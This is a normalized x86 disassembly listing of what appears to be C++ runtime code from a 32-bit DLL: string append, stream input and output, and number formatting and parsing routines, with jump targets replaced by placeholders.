mov eax [ esi + 0x14 ]
lea ecx [ eax + ebx ]
cmp ecx eax
jae r-xdata
test ebx ebx
jbe r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
mov eax [ esi + 0x14 ]
add eax ebx
push 0x0
push eax
mov ecx esi
mov [ ebp + 0x8 ] eax
call sub_100016c7
test al al
je r-xdata
cmp [ edi + 0x18 ] 0x8
jb r-xdata
add edi 0x4
mov edi [ edi + 0x4 ]
jmp r-xdata
lea edx [ esi + 0x4 ]
mov edx [ esi + 0x4 ]
jmp r-xdata
mov eax [ esi + 0x18 ]
cmp eax 0x8
jb r-xdata
push [ ebp + 0x10 ]
mov ecx [ esi + 0x14 ]
mov ebx [ ebp + 0xc ]
lea edi [ edi + ebx * 2 ]
sub eax ecx
push edi
push eax
lea eax [ edx + ecx * 2 ]
push eax
call sub_10001b42
add esp 0x10
push [ ebp + 0x8 ]
mov ecx esi
call sub_100016a9
sub_100054c3
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
push edi
mov esi ecx
call sub_1000188e
test al al
je r-xdata
or eax 0xffffffff
sub eax [ esi + 0x14 ]
push ebx
mov ebx [ ebp + 0xc ]
cmp eax ebx
jbe r-xdata
cmp [ esi + 0x18 ] 0x8
jb r-xdata
call sub_10022f44
mov eax [ esi + 0x14 ]
lea ecx [ eax + ebx ]
cmp ecx eax
jae r-xdata
lea eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
jmp r-xdata
test ebx ebx
jbe r-xdata
pop edi
pop esi
pop ebp
retn 0x8
push [ ebp + 0xc ]
sub edi eax
sar edi 0x1
push edi
push esi
mov ecx esi
call sub_1000541a
jmp r-xdata
mov eax esi
pop ebx
mov edi [ esi + 0x14 ]
push 0x0
add edi ebx
push edi
mov ecx esi
call sub_100016c7
test al al
je r-xdata
mov eax [ esi + 0x18 ]
cmp eax 0x8
jb r-xdata
lea edx [ esi + 0x4 ]
mov edx [ esi + 0x4 ]
jmp r-xdata
mov ecx [ esi + 0x14 ]
push ebx
push [ ebp + 0x8 ]
sub eax ecx
push eax
lea eax [ edx + ecx * 2 ]
push eax
call sub_10001b42
add esp 0x10
push edi
mov ecx esi
call sub_100016a9
sub_1000557f
push ebp
mov ebp esp
push ecx
push ecx
and [ ebp - 0x4 ] 0x0
push esi
mov esi eax
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x8 ]
call sub_100055ca
pop ecx
pop ecx
push 0x0
push [ ebp - 0x4 ]
mov ecx esi
call sub_1000583e
cmp [ esi + 0x18 ] 0x8
jb r-xdata
add esi 0x4
mov esi [ esi + 0x4 ]
jmp r-xdata
push [ ebp - 0x4 ]
push esi
push [ ebp + 0x8 ]
call sub_10005872
push [ ebp + 0x8 ]
call sub_1000575b
pop esi
leave
retn
sub_100055e3
push ebp
mov ebp esp
sub esp 0x18
and [ ebp - 0x8 ] 0x0
push ebx
push esi
push edi
mov edi eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x8 ]
call sub_100055ca
mov esi [ ebp - 0x8 ]
sub esp 0x14
mov ecx esp
mov [ ebp - 0xc ] esp
call sub_10003efc
push esi
mov ecx edi
call sub_10005936
mov ebx [ edi + 0xc ]
lea esi [ ebp - 0x10 ]
call sub_10018308
call sub_10024832
cmp eax [ ebp - 0x18 ]
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
lea esi [ ebp - 0x10 ]
call sub_100046ab
push [ ebp + 0x8 ]
call sub_1000557f
pop ecx
call sub_100046d3
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x14 ]
je r-xdata
mov ebx [ edi + 0x10 ]
lea esi [ ebp - 0x18 ]
call sub_10018308
mov eax [ ebp - 0x10 ]
test eax eax
je r-xdata
sub_10005662
push 0x24
mov eax sub_1004f110
call sub_10028236
mov esi [ ebp + 0x8 ]
xor ebx ebx
push ebx
push esi
lea eax [ ebp - 0x20 ]
push eax
mov [ ebp - 0x14 ] ebx
call sub_1000899d
mov [ ebp - 0x4 ] ebx
cmp [ ebp - 0x1c ] bl
je r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
add edx esi
cmp [ ebp - 0x14 ] ebx
je r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
add ecx esi
call sub_10003446
push eax
mov [ ebp - 0x4 ] 0x1
call sub_10007e06
pop ecx
lea ecx [ ebp - 0x18 ]
mov edi eax
call sub_10003c49
push [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0x2
mov eax [ esi ]
mov eax [ eax + 0x4 ]
add eax esi
mov ecx [ eax + 0x28 ]
cmp ecx ebx
lea ebx [ ebp - 0x14 ]
push ebx
push eax
sete dl
mov [ ebp - 0x24 ] 0x1
push [ ebp - 0x24 ]
xor eax eax
push eax
mov [ ebp - 0x2c ] dl
push [ ebp - 0x2c ]
mov edx [ edi ]
push ecx
lea eax [ ebp - 0x30 ]
push eax
mov ecx edi
call [ edx + 0x24 ]
xor ebx ebx
mov [ ebp - 0x4 ] ebx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x20 ]
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
mov eax [ ecx + eax + 0x28 ]
cmp eax ebx
je r-xdata
push ebx
push [ ebp - 0x14 ]
call sub_100039ed
mov eax esi
call sub_100282db
retn 0x8
lea ecx [ eax + 0x4 ]
call sub_10023135
sub_100056f0
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
add eax ecx
mov ecx [ eax + 0x8 ]
or ecx 0x4
cmp [ eax + 0x28 ] 0x0
jne r-xdata
push 0x1
push eax
call sub_10003dcd
and [ ebp - 0x4 ] 0x0
mov eax r-xdata
retn
or ecx 0x4
sub_1000575b
push 0x18
mov eax sub_1004f0e5
call sub_10028236
mov esi [ ebp + 0x8 ]
push 0xa
pop edi
push 0x1
push esi
lea eax [ ebp - 0x24 ]
xor ebx ebx
push eax
mov [ ebp - 0x1c ] 0x2
mov [ ebp - 0x18 ] ebx
mov [ esi + 0x4 ] ebx
call sub_1000899d
mov [ ebp - 0x4 ] ebx
cmp [ ebp - 0x20 ] bl
je r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
add edx esi
cmp [ ebp - 0x18 ] ebx
je r-xdata
mov [ ebp - 0x4 ] 0x1
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x24 ]
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
mov eax [ ecx + eax + 0x28 ]
cmp eax ebx
je r-xdata
push ebx
push [ ebp - 0x18 ]
call sub_100039ed
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov ecx [ eax + esi + 0x28 ]
call sub_1003f606
movzx eax ax
movzx eax ax
mov ecx 0xffff
cmp cx ax
jne r-xdata
dec [ ebp - 0x1c ]
js r-xdata
mov eax esi
call sub_100282db
retn 0x4
lea ecx [ eax + 0x4 ]
call sub_10023135
inc [ esi + 0x4 ]
cmp ax di
jne r-xdata
or [ ebp - 0x18 ] 0x1
jmp r-xdata
mov [ ebp - 0x4 ] ebx
jmp r-xdata
cmp [ ebp - 0x1c ] 0x7fffffff
je r-xdata
sub_100057d3
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
add eax ecx
mov ecx [ eax + 0x8 ]
xor ebx ebx
or ecx 0x4
cmp [ eax + 0x28 ] ebx
jne r-xdata
push 0x1
push eax
call sub_10003dcd
mov [ ebp - 0x4 ] ebx
mov eax r-xdata
retn
or ecx 0x4
sub_1000583e
mov edx [ ecx + 0x14 ]
mov eax [ esp + 0x4 ]
cmp eax edx
ja r-xdata
push [ esp + 0x8 ]
sub eax edx
push eax
call sub_1000517a
push 0xffffffff
push eax
call sub_10001629
jmp r-xdata
retn 0x8
sub_10005872
push 0x10
mov eax sub_1004f0c2
call sub_10028236
mov esi [ ebp + 0x8 ]
push 0x1
push esi
lea eax [ ebp - 0x1c ]
xor ebx ebx
push eax
mov [ ebp - 0x14 ] ebx
mov [ esi + 0x4 ] ebx
call sub_1000899d
mov [ ebp - 0x4 ] ebx
cmp [ ebp - 0x18 ] bl
je r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
add edx esi
cmp [ ebp - 0x14 ] ebx
je r-xdata
push [ ebp + 0x10 ]
mov [ ebp - 0x4 ] 0x1
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov ecx [ eax + esi + 0x28 ]
mov eax [ ecx ]
push 0xffffffff
push [ ebp + 0xc ]
call [ eax + 0x1c ]
add [ esi + 0x4 ] eax
cmp eax [ ebp + 0x10 ]
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x1c ]
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
mov eax [ ecx + eax + 0x28 ]
cmp eax ebx
je r-xdata
push ebx
push [ ebp - 0x14 ]
call sub_100039ed
mov [ ebp - 0x4 ] ebx
jmp r-xdata
mov [ ebp - 0x14 ] 0x3
mov eax esi
call sub_100282db
retn 0xc
lea ecx [ eax + 0x4 ]
call sub_10023135
sub_100058cb
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
add eax ecx
mov ecx [ eax + 0x8 ]
xor ebx ebx
or ecx 0x4
cmp [ eax + 0x28 ] ebx
jne r-xdata
push 0x1
push eax
call sub_10003dcd
mov [ ebp - 0x4 ] ebx
mov eax r-xdata
retn
or ecx 0x4
sub_10005936
push 0x1c
mov eax sub_1004ddd4
call sub_10028203
mov edi ecx
and [ ebp - 0x4 ] 0x0
mov ebx [ edi + 0x10 ]
mov eax ebx
sub eax [ edi + 0xc ]
push 0x1c
cdq
pop ecx
idiv ecx
cmp [ ebp + 0x8 ] eax
jbe r-xdata
jae r-xdata
lea esi [ ebp - 0x18 ]
call sub_10018308
push [ ebp - 0x14 ]
lea eax [ ebp + 0xc ]
push [ ebp - 0x18 ]
push eax
mov eax [ edi + 0x10 ]
sub eax [ edi + 0xc ]
push 0x1c
pop ecx
cdq
idiv ecx
mov ecx [ ebp + 0x8 ]
sub ecx eax
push ecx
mov ecx edi
call sub_100047d6
jmp r-xdata
push 0x0
push 0x1
lea ecx [ ebp + 0xc ]
call sub_10001500
call sub_100282db
retn 0x20
lea esi [ ebp - 0x18 ]
call sub_10018308
mov ebx [ edi + 0xc ]
lea esi [ ebp - 0x20 ]
call sub_10018308
push [ ebp + 0x8 ]
lea esi [ ebp - 0x28 ]
lea eax [ ebp - 0x20 ]
call sub_10004a68
push [ ebp - 0x14 ]
push [ ebp - 0x18 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x20 ]
push eax
push edi
call sub_10003152
sub_100059d4
push 0x50
mov eax sub_1004d9b9
call sub_1002826c
mov esi [ ebp + 0x14 ]
test [ esi + 0x10 ] 0x4000
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x34 ] edi
jne r-xdata
lea eax [ ebp - 0x3c ]
push eax
mov ecx esi
call sub_10003446
xor ebx ebx
push eax
mov [ ebp - 0x4 ] ebx
call sub_10007ea3
pop ecx
lea ecx [ ebp - 0x3c ]
mov [ ebp - 0x38 ] eax
call sub_10003c49
push ebx
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x14 ] 0x7
call sub_100016a9
mov ecx [ ebp - 0x38 ]
xor edi edi
inc edi
lea eax [ ebp - 0x5c ]
mov [ ebp - 0x4 ] edi
push eax
cmp [ ebp + 0x1c ] bl
je r-xdata
movzx edx [ ebp + 0x1c ]
mov eax [ ecx ]
push edx
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
call [ eax + 0x1c ]
mov eax edi
jmp r-xdata
call sub_1000be24
mov [ ebp - 0x4 ] 0x3
call sub_1000be3b
mov [ ebp - 0x4 ] 0x2
jmp r-xdata
call sub_100282ef
retn 0x18
xor edi edi
cmp eax [ ebp - 0x18 ]
jbe r-xdata
push 0xffffffff
push ebx
push eax
lea ecx [ ebp - 0x2c ]
call sub_10001450
push ebx
push edi
lea ecx [ ebp - 0x5c ]
mov [ ebp - 0x4 ] 0x1
call sub_10001500
mov eax [ esi + 0x18 ]
cmp eax ebx
jle r-xdata
cmp [ ebp - 0x14 ] 0x8
mov eax [ ebp - 0x28 ]
jae r-xdata
push edi
push [ ebp + 0x18 ]
lea eax [ ebp - 0x40 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
push [ ebp - 0x30 ]
call sub_100070cf
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
add esp 0x18
mov [ ebp + 0x10 ] eax
xor edi edi
sub eax [ ebp - 0x18 ]
mov edi eax
jmp r-xdata
push [ ebp - 0x18 ]
push eax
push [ ebp + 0x10 ]
lea eax [ ebp - 0x40 ]
push [ ebp + 0xc ]
push eax
push [ ebp - 0x30 ]
call sub_1000709a
mov ecx [ eax ]
push edi
push [ ebp + 0x18 ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
push eax
push ecx
push [ ebp - 0x34 ]
mov [ ebp + 0x10 ] eax
push [ ebp - 0x30 ]
mov [ esi + 0x18 ] ebx
call sub_100070cf
add esp 0x30
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10001500
mov eax [ ebp - 0x34 ]
lea eax [ ebp - 0x28 ]
mov eax [ esi + 0x10 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
sub_10005b25
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x54
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x50 ] eax
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov eax [ esi + 0x10 ]
push edi
push [ ebp + 0x1c ]
mov edi [ ebp + 0x8 ]
push eax
push r--data
lea eax [ esp + 0x1c ]
mov ebx ecx
push eax
push ebx
call sub_1000b416
add esp 0x10
push eax
lea eax [ esp + 0x20 ]
push 0x40
push eax
call sub_10024bfa
push eax
lea eax [ esp + 0x2c ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push ebx
call sub_10006e41
mov ecx [ esp + 0x8c ]
add esp 0x30
mov eax edi
pop edi
pop esi
pop ebx
xor ecx esp
call sub_100242d7
mov esp ebp
pop ebp
retn 0x18
sub_10005b9e
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x54
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x50 ] eax
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov eax [ esi + 0x10 ]
push edi
push [ ebp + 0x1c ]
mov edi [ ebp + 0x8 ]
push eax
push r--data
lea eax [ esp + 0x1c ]
mov ebx ecx
push eax
push ebx
call sub_1000b416
add esp 0x10
push eax
lea eax [ esp + 0x20 ]
push 0x40
push eax
call sub_10024bfa
push eax
lea eax [ esp + 0x2c ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push ebx
call sub_10006e41
mov ecx [ esp + 0x8c ]
add esp 0x30
mov eax edi
pop edi
pop esi
pop ebx
xor ecx esp
call sub_100242d7
mov esp ebp
pop ebp
retn 0x18
sub_10005c17
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x54
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x50 ] eax
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov eax [ esi + 0x10 ]
push edi
push [ ebp + 0x20 ]
mov edi [ ebp + 0x8 ]
push [ ebp + 0x1c ]
mov ebx ecx
push eax
push r--data
lea eax [ esp + 0x20 ]
push eax
push ebx
call sub_1000b416
add esp 0x10
push eax
lea eax [ esp + 0x24 ]
push 0x40
push eax
call sub_10024bfa
push eax
lea eax [ esp + 0x30 ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push ebx
call sub_10006e41
mov ecx [ esp + 0x90 ]
add esp 0x34
mov eax edi
pop edi
pop esi
pop ebx
xor ecx esp
call sub_100242d7
mov esp ebp
pop ebp
retn 0x1c
sub_10005c93
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x54
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x50 ] eax
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov eax [ esi + 0x10 ]
push edi
push [ ebp + 0x20 ]
mov edi [ ebp + 0x8 ]
push [ ebp + 0x1c ]
mov ebx ecx
push eax
push r--data
lea eax [ esp + 0x20 ]
push eax
push ebx
call sub_1000b416
add esp 0x10
push eax
lea eax [ esp + 0x24 ]
push 0x40
push eax
call sub_10024bfa
push eax
lea eax [ esp + 0x30 ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push ebx
call sub_10006e41
mov ecx [ esp + 0x90 ]
add esp 0x34
mov eax edi
pop edi
pop esi
pop ebx
xor ecx esp
call sub_100242d7
mov esp ebp
pop ebp
retn 0x1c
sub_10005d0f
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x94
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x90 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov [ esp + 0x18 ] ecx
mov ecx [ esi + 0x14 ]
xor ebx ebx
cmp ecx ebx
mov [ esp + 0x14 ] eax
push edi
mov eax 0x2000
jg r-xdata
mov edi ecx
push 0x24
pop ecx
cmp edi ecx
mov [ esp + 0x20 ] ecx
jg r-xdata
test [ esi + 0x10 ] eax
jne r-xdata
mov ecx [ esi + 0x10 ]
fld [ ebp + 0x1c ]
sub edi [ esp + 0x20 ]
mov edx ecx
and edx 0x3000
mov [ esp + 0x14 ] ebx
cmp edx eax
jne r-xdata
mov [ esp + 0x20 ] edi
push 0x6
pop ecx
push ecx
push ecx
fstp [ esp ]
push [ esp + 0x28 ]
lea eax [ esp + 0x2c ]
push ecx
push 0x0
push eax
push [ esp + 0x34 ]
call sub_1000aee8
add esp 0x10
push eax
lea eax [ esp + 0x38 ]
push 0x6c
push eax
call sub_10024bfa
push eax
push edi
push ebx
push [ esp + 0x38 ]
lea eax [ esp + 0x50 ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ esp + 0x54 ]
push [ esp + 0x5c ]
call sub_10006941
mov ecx [ esp + 0xe0 ]
mov eax [ esp + 0x5c ]
add esp 0x44
pop edi
pop esi
pop ebx
xor ecx esp
call sub_100242d7
mov esp ebp
pop ebp
retn 0x1c
fld [ r--data ]
fmul st1
fucomp st1
fnstsw ax
test ah 0x44
jpo r-xdata
fldz
fcom st1
fnstsw ax
test ah 0x41
jne r-xdata
mov [ esp + 0x13 ] bl
fxch st1
fxch st1
mov [ esp + 0x13 ] 0x1
fchs
jmp r-xdata
cmp [ esp + 0x14 ] 0x1388
jae r-xdata
fstp st1
jmp r-xdata
fld [ r--data ]
push 0xa
fcom st1
pop edx
fnstsw ax
fld [ r--data ]
test ah 0x41
jpo r-xdata
fdiv st2
add [ esp + 0x14 ] edx
fxch st1
fcom st2
fnstsw ax
test ah 0x41
jpo r-xdata
fxch st2
fcomp st1
fnstsw ax
test ah 0x5
jpe r-xdata
fxch st1
fstp st0
cmp [ esp + 0x13 ] 0x0
fstp st1
je r-xdata
cmp edi edx
jl r-xdata
fchs
fld [ r--data ]
fcomp st1
fnstsw ax
test ah 0x1
jne r-xdata
cmp ebx 0x1388
jae r-xdata
sub edi edx
fmul st1
add ebx edx
jmp r-xdata
sub_10005e8f
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x94
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x90 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov [ esp + 0x18 ] ecx
mov ecx [ esi + 0x14 ]
mov [ esp + 0x14 ] eax
push edi
mov eax 0x2000
test ecx ecx
jg r-xdata
mov edi ecx
push 0x24
pop ecx
cmp edi ecx
mov [ esp + 0x20 ] ecx
jg r-xdata
test [ esi + 0x10 ] eax
jne r-xdata
mov ecx [ esi + 0x10 ]
sub edi [ esp + 0x20 ]
and [ esp + 0x10 ] 0x0
and [ esp + 0x14 ] 0x0
mov edx ecx
and edx 0x3000
cmp edx eax
jne r-xdata
mov [ esp + 0x20 ] edi
push 0x6
pop ecx
fld [ ebp + 0x1c ]
fldz
fld [ ebp + 0x1c ]
fcom st1
fnstsw ax
test ah 0x5
jpe r-xdata
mov [ esp + 0xf ] 0x0
jmp r-xdata
mov [ esp + 0xf ] 0x1
fchs
fld [ r--data ]
push 0xa
fcom st1
mov ebx 0x1388
pop edx
fnstsw ax
fld [ r--data ]
test ah 0x41
jpo r-xdata
cmp [ esp + 0x10 ] ebx
jae r-xdata
fstp st1
jmp r-xdata
fdiv st2
add [ esp + 0x10 ] edx
fxch st1
fcom st2
fnstsw ax
test ah 0x41
jpo r-xdata
fxch st2
fcomp st1
fnstsw ax
test ah 0x5
jpe r-xdata
fxch st1
fstp st0
cmp [ esp + 0xf ] 0x0
fstp st1
je r-xdata
cmp edi edx
jl r-xdata
push ecx
push ecx
fstp [ esp ]
push [ esp + 0x28 ]
lea eax [ esp + 0x2c ]
push ecx
push 0x4c
push eax
push [ esp + 0x34 ]
call sub_1000aee8
add esp 0x10
push eax
lea eax [ esp + 0x38 ]
push 0x6c
push eax
call sub_10024bfa
push eax
push edi
push [ esp + 0x34 ]
lea eax [ esp + 0x4c ]
push [ esp + 0x34 ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ esp + 0x54 ]
push [ esp + 0x5c ]
call sub_10006941
mov ecx [ esp + 0xe0 ]
mov eax [ esp + 0x5c ]
add esp 0x44
pop edi
pop esi
pop ebx
xor ecx esp
call sub_100242d7
mov esp ebp
pop ebp
retn 0x1c
fchs
jmp r-xdata
fld [ r--data ]
fcomp st1
fnstsw ax
test ah 0x1
jne r-xdata
cmp [ esp + 0x14 ] ebx
jae r-xdata
sub edi edx
fmul st1
add [ esp + 0x14 ] edx
jmp r-xdata
sub_10006004
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x4c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x48 ] eax
mov eax [ ebp + 0x1c ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0x14 ]
push eax
push r--data
lea eax [ esp + 0x18 ]
push 0x40
push eax
mov ebx ecx
call sub_10024bfa
push eax
lea eax [ esp + 0x24 ]
push eax
push [ ebp + 0x18 ]
push edi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
push ebx
call sub_10006e41
mov ecx [ esp + 0x84 ]
add esp 0x30
pop edi
mov eax esi
pop esi
pop ebx
xor ecx esp
call sub_100242d7
mov esp ebp
pop ebp
retn 0x18
sub_1000606b
push 0x60
mov eax sub_1004d974
call sub_1002826c
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
or [ ebp - 0x50 ] 0xffffffff
mov [ ebp - 0x68 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x58 ] eax
mov eax [ ebp + 0x24 ]
xor ebx ebx
mov [ ebp - 0x6c ] eax
mov eax [ esi + 0x10 ]
inc ebx
mov [ ebp - 0x54 ] ecx
mov ecx esi
test eax 0x4000
je r-xdata
lea eax [ ebp - 0x60 ]
xor edi edi
push eax
mov [ ebp - 0x5c ] edi
call sub_10003446
lea ecx [ ebp - 0x5c ]
push ecx
push eax
mov [ ebp - 0x4 ] 0x4
mov esi [ esi + 0x10 ]
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x54 ]
call sub_100070f8
add esp 0x18
push eax
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_10023ad9
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x60 ]
mov esi eax
call sub_10003c49
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x64 ] eax
je r-xdata
lea eax [ ebp - 0x54 ]
push eax
call sub_10003446
xor edi edi
push eax
mov [ ebp - 0x4 ] edi
call sub_10007ea3
pop ecx
or esi 0xffffffff
lea ecx [ ebp - 0x54 ]
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x4 ] esi
call sub_10003c49
push edi
push ebx
lea ecx [ ebp - 0x4c ]
call sub_1000691b
mov ecx [ ebp - 0x50 ]
lea eax [ ebp - 0x2c ]
push eax
mov [ ebp - 0x4 ] ebx
call sub_1000be24
push esi
push edi
push eax
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x2
call sub_1000541a
push edi
push ebx
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] bl
call sub_10001500
push edi
push ebx
lea ecx [ ebp - 0x4c ]
call sub_1000517a
mov ecx [ ebp - 0x50 ]
lea eax [ ebp - 0x2c ]
push eax
call sub_1000be3b
push esi
push edi
push eax
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x3
call sub_1000541a
push edi
push ebx
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] bl
call sub_10001500
cmp [ ebp - 0x34 ] 0x8
mov eax [ ebp - 0x48 ]
jae r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100081f6
test al al
mov eax [ ebp - 0x58 ]
je r-xdata
cmp [ ebp - 0x5c ] edi
jne r-xdata
push eax
push 0x2
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_10007f40
add esp 0x10
push edi
push ebx
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x4 ] esi
call sub_10001500
jmp r-xdata
lea eax [ ebp - 0x48 ]
cmp [ ebp - 0x50 ] edi
jge r-xdata
or [ eax ] ebx
cmp esi ebx
ja r-xdata
mov ecx [ ebp - 0x6c ]
setne al
mov [ ecx ] al
or [ eax ] 0x2
jmp r-xdata
mov [ ebp - 0x50 ] esi
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x68 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_100282ef
retn 0x20
sub_10006209
push 0x38
mov eax sub_1004d927
call sub_1002826c
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x38 ] 0x0
mov [ ebp - 0x40 ] eax
lea eax [ ebp - 0x3c ]
mov [ ebp - 0x34 ] ecx
push eax
mov ecx esi
call sub_10003446
and [ ebp - 0x4 ] 0x0
mov esi [ esi + 0x10 ]
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x34 ]
call sub_100070f8
or [ ebp - 0x4 ] 0xffffffff
add esp 0x18
lea ecx [ ebp - 0x3c ]
mov esi eax
call sub_10003c49
cmp [ ebp - 0x30 ] 0x2d
lea eax [ ebp - 0x2f ]
je r-xdata
mov [ ebp - 0x34 ] eax
lea eax [ ebp - 0x38 ]
push eax
push esi
lea eax [ ebp - 0x44 ]
push eax
push [ ebp - 0x34 ]
call sub_10023ad9
mov esi eax
add esp 0x10
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100081f6
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
mov eax [ ebp - 0x34 ]
cmp [ ebp - 0x44 ] eax
je r-xdata
or [ edi ] 0x1
or [ edi ] 0x2
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
cmp esi 0xffff
ja r-xdata
cmp [ ebp - 0x30 ] 0x2d
jne r-xdata
mov [ ebx ] si
jmp r-xdata
neg esi
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x40 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_100282ef
retn 0x20
sub_100062d8
push 0x38
mov eax sub_1004d927
call sub_1002826c
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x38 ] 0x0
mov [ ebp - 0x40 ] eax
lea eax [ ebp - 0x3c ]
mov [ ebp - 0x34 ] ecx
push eax
mov ecx esi
call sub_10003446
and [ ebp - 0x4 ] 0x0
mov esi [ esi + 0x10 ]
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x34 ]
call sub_100070f8
or [ ebp - 0x4 ] 0xffffffff
add esp 0x18
lea ecx [ ebp - 0x3c ]
mov esi eax
call sub_10003c49
cmp [ ebp - 0x30 ] 0x2d
lea eax [ ebp - 0x2f ]
je r-xdata
mov [ ebp - 0x34 ] eax
lea eax [ ebp - 0x38 ]
push eax
push esi
lea eax [ ebp - 0x44 ]
push eax
push [ ebp - 0x34 ]
call sub_10023ad9
mov esi eax
add esp 0x10
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100081f6
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
mov eax [ ebp - 0x34 ]
cmp [ ebp - 0x44 ] eax
je r-xdata
